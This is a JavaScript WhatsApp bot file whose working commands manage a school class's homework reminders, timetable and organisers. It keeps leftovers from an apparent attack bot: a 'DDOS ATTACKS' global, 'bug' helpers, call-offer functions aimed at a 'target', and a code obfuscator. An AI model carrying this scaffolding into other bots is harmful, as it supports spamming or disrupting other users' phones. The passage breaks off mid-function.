//CLEAR CONSOLE
console.clear();

//END
//SCANING CONTROL
require('./database/settings.js')
//END

//INSTALLING BAILEYS

const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	makeInMemoryStore,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys");

//END
//EXPORTS BASIC MODULE

const fs = require('fs')
const util = require('util')
const path = require('path');
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const jimp = require("jimp")
const sharp = require('sharp')
const crypto = require('crypto')
const yts = require('yt-search')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator');
const { VocalRemover } = require('./database/pusat/Data8.js');
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./database/pusat/scraper.js');
const { ocrSpace } = require("ocr-space-api-wrapper");
const { JSDOM } = require('jsdom')
const func = require('./database/pusat/utils.js')

//END
//MODULE MESSAGE + PREFIX

module.exports = sock = async (sock, m, chatUpdate, store) => {
    try {
      var body = (
      m.mtype === "conversation" ? m.message.conversation :
      m.mtype === "imageMessage" ? m.message.imageMessage.caption :
      m.mtype === "videoMessage" ? m.message.videoMessage.caption :
      m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
      m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
      m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
      m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
      m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
      m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
                        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix
  
//END
//DATA TAMBAHAN + PELENGKAP
const { 
smsg, 
tanggal, 
getTime, 
isUrl, 
sleep, 
clockString, 
runtime, 
fetchJson, 
getBuffer, 
jsonformat, 
format, 
parseMention, 
getRandom, 
getGroupAdm, 
generateProfilePicture 
} = require('./database/pusat/Data1.js')



//END

//DDOS ATTACKS
global.ongoingAttacks = global.ongoingAttacks || [];

//DATA USER + DATA MESSAGE

const Owner = JSON.parse(fs.readFileSync('./account/Own.json'))
const Premium = JSON.parse(fs.readFileSync('./account/Prem.json'))
const isGrupReseller = Premium.includes(m.chat)
const isGroup = m.chat.endsWith('@g.us')
const CMD = body.startsWith(prefix)
const fullCommand = body.slice(prefix.length).trim();
const command = fullCommand.split(' ')[0].toLowerCase();
const args = body.trim().split(/ +/).slice(1)
const BotNum = await sock.decodeJid(sock.user.id)
const DevOnly = [BotNum, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;
const qtext = q = args.join(" ")
const text = q = args.join(" ");
const cheerio = require('cheerio');
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await sock.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const GroupAdm = m.isGroup ? await getGroupAdm(participants) : ''
const BotAdm = m.isGroup ? GroupAdm.includes(BotNum) : false
const Adm = m.isGroup ? GroupAdm.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const pino = require('pino')
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
const ImageBugs = [
  'https://pomf2.lain.la/f/26rzmf0x.jpg',
  'https://pomf2.lain.la/f/g37vbcv7.jpg',
  'https://pomf2.lain.la/f/6yjlw5u8.jpg'
];

const RandomBugs = ImageBugs[Math.floor(Math.random() * ImageBugs.length)];
const imageList = [
  'https://pomf2.lain.la/f/26rzmf0x.jpg',
  'https://pomf2.lain.la/f/g37vbcv7.jpg',
  'https://pomf2.lain.la/f/6yjlw5u8.jpg'
];
const RandomMenu = imageList[Math.floor(Math.random() * imageList.length)];
const menu = fs.readFileSync('./database/pusat/image/menu.jpg')
const imageArray = [menu];
const randomImage = imageArray[Math.floor(Math.random() * imageArray.length)];
const qtext2 = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: "𝗖𝗿𝗼𝗻𝗲𝘅𝗶𝘀 𝗜𝘀 𝗛𝗲𝗿𝗲 🌀" }}}
let image = fs.readFileSync('./database/pusat/image/menu.jpg')
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta', // Zona waktu WIB
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});
const mime = (quoted.msg || quoted).mimetype || ''
const THM = "https://pomf2.lain.la/f/26rzmf0x.jpg"
const Xxx = "https://pomf2.lain.la/f/26rzmf0x.jpg"


//END

if (m.isGroup && participants && Array.isArray(participants)) {
  const senderId = m.sender;
  const botId = sock.user.id || sock.user.jid; // tergantung struktur sock

  isAdminGrup = GroupAdm.includes(senderId);
  isBotAdmin = GroupAdm.includes(botId);
}


//DATA TIKTOK SCRAPER

const { tiktok } = require('./database/pusat/Data5.js')
const successreact = ['✅']
		const finishmoji = successreact[Math.floor(Math.random() * successreact.length)]
		const taskdone = (teks) => {
			return sock.sendMessage(m.chat, {
				react: {
					text: teks,
					key: m.key
				}
			})
		}
//END
//EXPORTS MODULE BRAT + STICKER

const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('./database/pusat/Data2.js')
//END

//SEETINGS STATUS BOT
if (!sock.public) {
if (!DevOnly) return
}

let flux = null;

//END
//INFO NEW MESSAGE IN CONSOLE

if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  }
}

//END



//AUTO RECORDING

let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
//sock.sendPresenceUpdate(jd, from) // HAPUS UNTUK MEMATIKAN
}

async function loading () {
var Floading = [
"",
"",
""
]
let { key } = await sock.sendMessage(from, {text: " "})
for (let i = 0; i < Floading.length; i++) {
await sock.sendMessage(from, {text: Floading[i], edit: key });
}
}

//END
//FILE RESIZE ( FAKE )

const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}

//END
//FUNCTION OBF

async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Me`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

//END
var example = (teks) => {
return `Example : ${command} ${teks}`
}

//END

//SEND CALL
async function sendOfferCall(target) {
    try {
        await sock.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}

async function sendOfferVideoCall(target) {
    try {
        await sock.offerCall(target, { 
        video: true 
        });
        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
    }
}
sock.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await sock.sendPresenceUpdate('composing', jid)
      return sock.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
const xreplyWithButto = (teks) => {
  const buttons = [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: '鬼 𝐃𝐞𝐯𝐨𝐥𝐨𝐩𝐞𝐫'
    }
  },
  {
    buttonId: '.buysc',
    buttonText: {
      displayText: '翔 𝐁𝐮𝐲 𝐒𝐜𝐫𝐢𝐩𝐭'
    }
  },
  {
    buttonId: '.tqto',
    buttonText: {
      displayText: '夢 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎'
    }
  }
];
  const buttonMessage = {
  image: randomImage,
  caption: teks,
  footer: '𝗖𝗿𝗼𝗻𝗲𝘅𝗶𝘀 𝗜𝘀 𝗛𝗲𝗿𝗲 🌀',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363400355600581@newsletter",
      serverMessageId: null,
      newsletterName: `𝗖𝗿𝗼𝗻𝗲𝘅𝗶𝘀 𝗜𝘀 𝗛𝗲𝗿𝗲 🌀`
    },
    mentionedJid: ['13135550002@s.whatsapp.net'],
  },
  viewOnce: true
};

  return sock.sendMessage(m.chat, buttonMessage, { quoted: lol });
}

const xreplyWithButto2 = (teks) => {
  const buttons = [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: '鬼 𝐃𝐞𝐯𝐨𝐥𝐨𝐩𝐞𝐫'
    }
  },
  {
    buttonId: '.buysc',
    buttonText: {
      displayText: '翔 𝐁𝐮𝐲 𝐒𝐜𝐫𝐢𝐩𝐭'
    }
  },
  {
    buttonId: '.tqto',
    buttonText: {
      displayText: '夢 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎'
    }
  }
];
  const buttonMessage = {
  image: randomImage,
  caption: teks,
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363400355600581@newsletter",
      serverMessageId: null,
      newsletterName: `𝗖𝗿𝗼𝗻𝗲𝘅𝗶𝘀 𝗜𝘀 𝗛𝗲𝗿𝗲 🌀`
    },
    mentionedJid: ['13135550002@s.whatsapp.net'],
  },
  viewOnce: true
};

  return sock.sendMessage(m.chat, buttonMessage, { quoted: lol });
}

const xreplybugbutton = (teks) => {
  const buttons = [
    {
    buttonId: '.owner',
    buttonText: {
      displayText: '鬼 𝐃𝐞𝐯𝐨𝐥𝐨𝐩𝐞𝐫'
    }
    }
  ];

  const buttonMessage = {
  image: randomImage,
  caption: teks,
  footer: '𝗖𝗿𝗼𝗻𝗲𝘅𝗶𝘀 𝗜𝘀 𝗛𝗲𝗿𝗲 🌀',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363400355600581@newsletter",
      serverMessageId: null,
      newsletterName: `𝗖𝗿𝗼𝗻𝗲𝘅𝗶𝘀 𝗜𝘀 𝗛𝗲𝗿𝗲 🌀`
    },
    mentionedJid: ['13135550002@s.whatsapp.net'],
  },
  viewOnce: true
};

  return sock.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
const fluxreply = (teks) => {
    return sock.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝗖𝗿𝗼𝗻𝗲𝘅𝗶𝘀 𝗜𝘀 𝗛𝗲𝗿𝗲 🌀`,
                body: `© 𝗙𝗹𝘂𝘅𝗫𝗬𝗭`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: randomImage,
                sourceUrl: `https://whatsapp.com/channel/0029Vb6V3iS4o7qHelFyPw3n`
            }
        }
    }, { quoted: lol });
}

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: image,
      itemCount: "7777",
      status: "INQUIRY",
      surface: "",
      message: `𝗖𝗿𝗼𝗻𝗲𝘅𝗶𝘀 🌀\n𝗖𝗼𝗺𝗺𝗮𝗻𝗱 : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363400355600581@newsletter"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const lol2 = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: image,
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363419767460679@newsletter"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
		
const ThumbUrl = "https://pomf2.lain.la/f/26rzmf0x.jpg"
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
async function makeStickerFromUrl(imageUrl, sock, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await sock.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `𝗖𝗿𝗼𝗻𝗲𝘅𝗶𝘀 𝗜𝘀 𝗛𝗲𝗿𝗲 🌀`,
                    body: `© 𝗙𝗹𝘂𝘅𝗫𝗬𝗭`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: ThumbUrl, 
                    sourceUrl: `https://youtube.com/@fluxx-md`
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        m.reply('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}

let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

let limitUser = PremOnly ? 1 : global.limitCount
async function useLimit(sender, amount) {
     users.limit -= amount;
     users.totalLimit += amount;
     m.reply(`Limit Anda Telah Digunakan Sebanyak ${amount} Dari ${users.limit} Limit Kamu`,
        );
 }
  
//=================================================//

const RunTime = `_${runtime(process.uptime())}_`
const namaOrang = m.pushName || "No Name";
const info = `${namaOrang}`;
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

// SEMUA SISTEM REKAP TUGAS
let tugasDB = [];
moment.locale('id');

// Load data saat bot start


const cron = require('node-cron');
const zonaWaktu = 'Asia/Makassar';
const now = moment().tz(zonaWaktu);

const isPengurus = PremOnly || DevOnly;

const emojiMapel = {
  'RPL': '💻',
  'PKWU': '💸',
  'Bahasa Inggris': '🇬🇧',
  'Bahasa Indonesia': '🇮🇩',
  'Bahasa Bali': '🪻',
  'Matematika': '📐',
  'Agama': '🙏',
  'DKV': '🎨',
};

const mapelValid = [
  'rpl',
  'pkwu',
  'bahasa inggris',
  'bahasa indonesia',
  'bahasa bali',
  'matematika',
  'agama islam',
  'agama kristen',
  'agama katolik',
  'agama hindu',
  'agama konghucu',
  'dkv'
];      

function toTitleCase(str) {
  return str
    .toLowerCase()
    .split(' ')
    .map(kata => kata.charAt(0).toUpperCase() + kata.slice(1))
    .join(' ');
  }

  function getEmojiMapel(mapelRaw) {
    const emojiMapel = {
      'Rpl': '💻',
      'Pkwu': '💸',
      'Bahasa Inggris': '🇬🇧',
      'Bahasa Indonesia': '🇮🇩',
      'Bahasa Bali': '🪻',
      'Matematika': '📐',
      'Agama Islam': '🙏',
      'Agama Kristen': '🙏',
      'Agama Katolik': '🙏',
      'Agama Hindu': '🙏',
      'Agama Konghucu': '🙏',
      'Dkv': '🎨',
    };
    
    const mapelFormatted = toTitleCase(mapelRaw); // contoh: 'rpl' → 'Rpl'
    
    // Coba cari emoji berdasarkan mapel yang sudah diformat
    const emoji = emojiMapel[mapelFormatted] || '';
    return {
      emoji,
      mapel: mapelFormatted,
    };
  }
  
  function cleanTugas() {
    const fs = require('fs');
    const moment = require('moment-timezone');
    const zonaWaktu = 'Asia/Makassar';
    const filePath = './database/tugas.json';
  
    if (!fs.existsSync(filePath)) return;
  
    const now = moment().tz(zonaWaktu);
    let semuaTugas = JSON.parse(fs.readFileSync(filePath));
  
    semuaTugas = semuaTugas.filter(tugas => {
      const deadline = moment.tz(tugas.deadline, 'DD-MM-YYYY', true, zonaWaktu);
      const batasAkhir = deadline.clone().add(1, 'days');
      return batasAkhir.isSameOrAfter(now);
    });
  
    fs.writeFileSync(filePath, JSON.stringify(semuaTugas, null, 2));
  }


switch(command) {

case 'menu': {
  const menuText = `📚 *Menu Bot Kelas* 📚

1️⃣ .addtugas - Tambah tugas baru
2️⃣ .tugas - Lihat daftar tugas
3️⃣ .autoreminder on/off - Aktifkan atau nonaktifkan reminder otomatis
4️⃣ .addpengurus - Tambah pengurus grup
5️⃣ .delpengurus - Hapus pengurus grup
6️⃣ .listpengurus - Lihat daftar pengurus grup
7️⃣ .jadwal - Lihat jadwal pelajaran

Uptime: ${runtime(process.uptime())}`;

  const imagePath = './database/pusat/image/menu.jpg';

  const imageBuffer = fs.readFileSync(imagePath);

  await sock.sendMessage(from, {
    image: imageBuffer,
    caption: menuText,
    footer: "© gregXYZ",
    contextInfo: {
      mentionedJid: ['69@s.whatsapp.net'],
      externalAdReply: {
        showAdAttribution: false,
        title: 'Bot WhatsApp Kelas',
        body: '© Pengurus Kelas',
        mediaType: 1,
        sourceUrl: '',
        thumbnail: imageBuffer
      }
    }
  }, { quoted: m });
}
break;

case 'jadwal': {
  const menuText = `Berikut adalah jadwal pelajaran kelas!`;

  const imagePath = './database/pusat/image/jadwal.jpeg';

  const imageBuffer = fs.readFileSync(imagePath);

  await sock.sendMessage(from, {
    image: imageBuffer,
    caption: menuText,
    contextInfo: {
      mentionedJid: ['69@s.whatsapp.net'],
    }
  }, { quoted: m });
}
break;

case 'tambahtugas': 
case 'addtugas': {
  const fs = require('fs');
  const moment = require('moment-timezone');
  const zonaWaktu = 'Asia/Makassar';
  const folder = './database';
  const path = `${folder}/tugas.json`;

  // Daftar mapel yang valid
  const mapelValid = [
    'rpl', 'pkwu', 'bahasa inggris', 'bahasa indonesia', 'bahasa bali',
    'matematika', 'agama islam', 'agama kristen', 'agama katolik',
    'agama hindu', 'agama konghucu', 'dkv'
  ];

  // Emoji khusus untuk mapel agama
  const emojiMapel = {
    'agama islam': '🙏',
    'agama kristen': '🙏',
    'agama katolik': '🙏',
    'agama hindu': '🙏',
    'agama konghucu': '🙏'
  };

  // Pastikan folder dan file tersedia
  if (!fs.existsSync(folder)) fs.mkdirSync(folder);
  if (!fs.existsSync(path)) fs.writeFileSync(path, '[]');

  cleanTugas();

  if (!isPengurus) return m.reply("*Kamu Bukan Pengurus Kelas!*");

  const input = args.join(' ');
  const parts = input.split('|');

  if (parts.length !== 3) {
    return sock.sendMessage(from, {
      text: '❌ Format salah. Gunakan:\n.addtugas <mapel>|<deskripsi>|<tanggal>\n\nContoh: .addtugas Matematika|Kerjakan soal halaman 45|04-08-2025'
    }, { quoted: m });
  }

  const [mapelRaw, deskripsi, tanggalStrRaw] = parts.map(p => p.trim());
  const mapel = mapelRaw.toLowerCase();

  // Validasi mapel
  if (!mapelValid.includes(mapel)) {
    return sock.sendMessage(from, {
      text: `❌ Mapel *${mapelRaw}* tidak dikenali.\nKetik .mapel untuk melihat mata pelajaran yang valid!`
    }, { quoted: m });
  }

  // Normalisasi tanggal
  const tanggalParts = tanggalStrRaw.split('-');
  if (tanggalParts.length !== 3) {
    return sock.sendMessage(from, {
      text: '❌ Format tanggal harus seperti: 04-08-2025'
    }, { quoted: m });
  }

  let [day, month, year] = tanggalParts.map(p => p.padStart(2, '0'));
  day = parseInt(day);
  month = parseInt(month);
  year = parseInt(year);

  if (day < 1 || day > 31 || month < 1 || month > 12 || year < 2024) {
    return sock.sendMessage(from, {
      text: '❌ Tanggal tidak valid. Pastikan hari ≤ 31 dan bulan ≤ 12.'
    }, { quoted: m });
  }

  const tanggalStr = `${String(day).padStart(2, '0')}-${String(month).padStart(2, '0')}-${year}`;
  const now = moment().tz(zonaWaktu);
  moment.locale('id');

  const deadline = moment.tz(tanggalStr, 'DD-MM-YYYY', true, zonaWaktu);

  if (!deadline.isValid()) {
    return sock.sendMessage(from, {
      text: '❌ Format tanggal tidak valid. Gunakan contoh: 04-08-2025'
    }, { quoted: m });
  }

  if (deadline.isBefore(now)) {
    return sock.sendMessage(from, {
      text: '⚠️ Tugas tidak bisa ditambahkan karena tanggal sudah lewat.'
    }, { quoted: m });
  }

  const emoji = emojiMapel[mapel] || '';

  const tugasBaru = {
    mapel,
    emoji,
    deskripsi,
    deadline: deadline.format('DD-MM-YYYY'),
    timestamp: deadline.valueOf(),
    dibuat: now.format('DD-MM-YYYY HH:mm:ss'),
    status: 'belum',
    jid: from
  };

  // Simpan ke file
  let semuaTugas = [];
  try {
    semuaTugas = JSON.parse(fs.readFileSync(path));
    if (!Array.isArray(semuaTugas)) semuaTugas = [];
  } catch (err) {
    console.error('❌ Gagal membaca tugas.json:', err);
    semuaTugas = [];
  }

  semuaTugas.push(tugasBaru);

  try {
    fs.writeFileSync(path, JSON.stringify(semuaTugas, null, 2));
    console.log('✅ Tugas berhasil disimpan:', tugasBaru);
  } catch (err) {
    console.error('❌ Gagal menulis ke tugas.json:', err);
    return sock.sendMessage(from, {
      text: '❌ Gagal menyimpan tugas. Cek izin folder atau file.'
    }, { quoted: m });
  }

  return sock.sendMessage(from, {
    text: `✅ Tugas berhasil ditambahkan:\n📚 *${mapelRaw}*\n- ${deskripsi}\n- Deadline: ${deadline.format('D MMMM YYYY')}`
  }, { quoted: m });
}
break;

case 'deltugas':
case 'hapustugas': {
  if (!isPengurus) return m.reply("*Kamu Bukan Pengurus Kelas!*");

  const indexStr = args[0];
  const index = parseInt(indexStr) - 1;

  const fs = require('fs');
  const path = './database/tugas.json';
  let semuaTugas = [];

  if (!fs.existsSync(path)) {
    return sock.sendMessage(from, {
      text: '📂 Belum ada data tugas yang tersimpan.'
    }, { quoted: m });
  }

  semuaTugas = JSON.parse(fs.readFileSync(path));

  if (isNaN(index) || index < 0 || index >= semuaTugas.length) {
    return sock.sendMessage(from, {
      text: '❌ Index tugas tidak valid. Gunakan angka sesuai daftar tugas.'
    }, { quoted: m });
  }

  const tugasDihapus = semuaTugas.splice(index, 1)[0];
  fs.writeFileSync(path, JSON.stringify(semuaTugas, null, 2));

  return sock.sendMessage(from, {
    text: `🗑️ Tugas berhasil dihapus:\n📚 *${tugasDihapus.mapel}*\n📝 ${tugasDihapus.deskripsi}\n📅 Deadline: ${tugasDihapus.deadline}`
  }, { quoted: m });
}
break;

case 'edittugas': {
  if (!isPengurus) return m.reply("*Kamu Bukan Pengurus Kelas!*");

  const input = args.join(' ');
  const parts = input.split('|');

  if (parts.length !== 4) {
    return sock.sendMessage(from, {
      text: '❌ Format salah. Gunakan:\n.edittugas <index>|<mapel>|<deskripsi>|<tanggal>\nContoh: .edittugas 2|Biologi|Ulangi eksperimen|20 Agustus 2025'
    }, { quoted: m });
  }

  const [indexStr, mapelRaw, deskripsi, tanggalStr] = parts.map(p => p.trim());
  const index = parseInt(indexStr) - 1;

  const fs = require('fs');
  const path = './database/tugas.json';
  let semuaTugas = [];

  if (fs.existsSync(path)) {
    semuaTugas = JSON.parse(fs.readFileSync(path));
  }

  if (isNaN(index) || index < 0 || index >= semuaTugas.length) {
    return sock.sendMessage(from, {
      text: '❌ Index tugas tidak valid.'
    }, { quoted: m });
  }

  // Validasi tanggal
  const moment = require('moment-timezone');
  const zonaWaktu = 'Asia/Makassar';
  const now = moment().tz(zonaWaktu);
  const deadline = moment.tz(tanggalStr, ['D MMMM YYYY', 'DD-MM-YYYY', 'YYYY/MM/DD'], true, zonaWaktu);

  if (!deadline.isValid()) {
    return sock.sendMessage(from, {
      text: '❌ Format tanggal tidak valid. Gunakan contoh: 20 Agustus 2025'
    }, { quoted: m });
  }

  if (deadline.isBefore(now)) {
    return sock.sendMessage(from, {
      text: '⚠️ Tanggal baru sudah lewat. Tidak bisa disimpan.'
    }, { quoted: m });
  }

  // Update tugas
  semuaTugas[index] = {
    ...semuaTugas[index],
    mapel: mapelRaw.toLowerCase(),
    deskripsi,
    deadline: deadline.format('DD-MM-YYYY'),
    diedit: now.format('DD-MM-YYYY HH:mm:ss')
  };

  fs.writeFileSync(path, JSON.stringify(semuaTugas, null, 2));

  return sock.sendMessage(from, {
